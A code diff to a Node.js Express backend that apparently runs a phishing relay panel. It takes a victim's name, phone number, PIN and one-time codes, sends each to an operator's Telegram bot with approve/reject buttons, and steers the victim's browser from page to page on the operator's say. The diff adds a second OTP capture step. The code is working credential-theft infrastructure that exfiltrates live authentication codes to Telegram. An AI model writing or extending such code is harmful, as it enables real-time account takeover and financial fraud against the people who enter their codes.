@@ -11,6 +11,7 @@ const DOMAIN = process.env.BACKEND_DOMAIN;
 const phoneRequests = {};
 const otpRequests = {};
 const pinRequests = {};
+const otp2Requests = {};          // <-- NEW for second OTP
 const requestMeta = {};
 
 // ---------- BOTS ----------
@@ -107,7 +108,7 @@ app.post('/submit-phone', (req, res) => {
 
 app.get('/check-phone/:id', (req, res) => {
   const result = phoneRequests[req.params.id];
-  if (result === true) return res.json({ redirect: 'code.html' });   // ✅ Redirect to OTP page
+  if (result === true) return res.json({ redirect: 'code.html' });
   if (result === false) return res.json({ approved: false });
   res.json({ approved: null });
 });
@@ -184,6 +185,42 @@ app.get('/check-pin/:id', (req, res) => {
   res.json({ approved: pinRequests[req.params.id] ?? null });
 });
 
+// ---------- NEW: SECOND OTP STEP ----------
+app.post('/submit-otp2', (req, res) => {
+  try {
+    const { name, phone, otp, botId } = req.body;
+    const bot = getBot(botId);
+    if (!bot) return res.status(400).json({ error: 'Invalid bot' });
+
+    const requestId = uuidv4();
+    otp2Requests[requestId] = null;
+    requestMeta[requestId] = { name, phone, botId };
+
+    sendTelegram(
+      bot,
+      `📲 SECOND OTP VERIFICATION
+👤 Name: ${name}
+📞 Phone: ${phone}
+🔢 OTP: ${otp}
+🆔 Ref: ${requestId}`,
+      [
+        [
+          { text: '✅ Correct OTP', callback_data: `otp2_ok:${requestId}` },
+          { text: '❌ Wrong OTP', callback_data: `otp2_bad:${requestId}` }
+        ]
+      ]
+    );
+
+    res.json({ requestId });
+  } catch {
+    res.status(500).json({ error: 'Internal server error' });
+  }
+});
+
+app.get('/check-otp2/:id', (req, res) => {
+  res.json({ approved: otp2Requests[req.params.id] ?? null });
+});
+
 // ---------- TELEGRAM CALLBACK WEBHOOK ----------
 app.post('/telegram-webhook/:botId', async (req, res) => {
   const bot = getBot(req.params.botId);
@@ -220,11 +257,21 @@ app.post('/telegram-webhook/:botId', async (req, res) => {
   // PIN decisions
   if (action === 'pin_ok') {
     pinRequests[requestId] = true;
-    feedback = '✅ PIN approved – redirecting to success page';
+    feedback = '✅ PIN approved – redirecting to second OTP page';
   }
   if (action === 'pin_bad') {
     pinRequests[requestId] = false;
     feedback = '❌ PIN rejected';
+  }
+
+  // ---------- NEW: SECOND OTP decisions ----------
+  if (action === 'otp2_ok') {
+    otp2Requests[requestId] = true;
+    feedback = '✅ Second OTP approved – redirecting to success page';
+  }
+  if (action === 'otp2_bad') {
+    otp2Requests[requestId] = false;
+    feedback = '❌ Second OTP rejected';
   }
 
   if (feedback && meta) {
